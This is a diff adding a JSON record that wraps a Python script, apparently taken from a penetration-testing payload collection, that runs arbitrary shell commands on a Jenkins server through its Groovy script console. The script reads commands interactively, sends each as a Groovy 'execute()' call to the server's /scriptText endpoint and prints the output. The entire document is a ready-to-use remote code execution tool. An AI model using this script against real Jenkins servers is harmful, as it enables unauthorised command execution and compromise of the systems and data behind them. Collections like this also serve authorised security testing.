@@ -1,0 +1,7 @@
+{
+    "code": "#!/usr/bin/env python\r\n# SRC: https://raw.githubusercontent.com/bl4de/security-tools/master/jgc.py\r\n# DOC: https://medium.com/@_bl4de/remote-code-execution-with-groovy-console-in-jenkins-bd6ef55c285b\r\nfrom __future__ import print_function\nfrom builtins import input\nimport requests\r\nimport sys\r\n\r\nprint(\"\"\"\r\nJenkins Groovy Console cmd runner.\r\n\r\nusage: ./jgc.py [HOST]\r\n\r\nThen type any command and wait for STDOUT output from remote machine.\r\nType 'exit' to exit :)\r\n\"\"\")\r\nURL = sys.argv[1] + '/scriptText'\r\nHEADERS = {\r\n    'User-Agent': 'jgc'\r\n}\r\n\r\nwhile 1:\r\n    CMD = input(\">> Enter command to execute (or type 'exit' to exit): \")\r\n    if CMD == 'exit':\r\n        print(\"exiting...\\n\")\r\n        exit(0)\r\n\r\n    DATA = {\r\n        'script': 'println \"{}\".execute().text'.format(CMD)\r\n    }\r\n    result = requests.post(URL, headers=HEADERS, data=DATA)\r\n    print(result.text)",
+    "source": "github_repo:swisskyrepo/PayloadsAllTheThings",
+    "file": "CVE Exploits/Jenkins Groovy Console.py",
+    "license": "MIT",
+    "language": "python"
+}
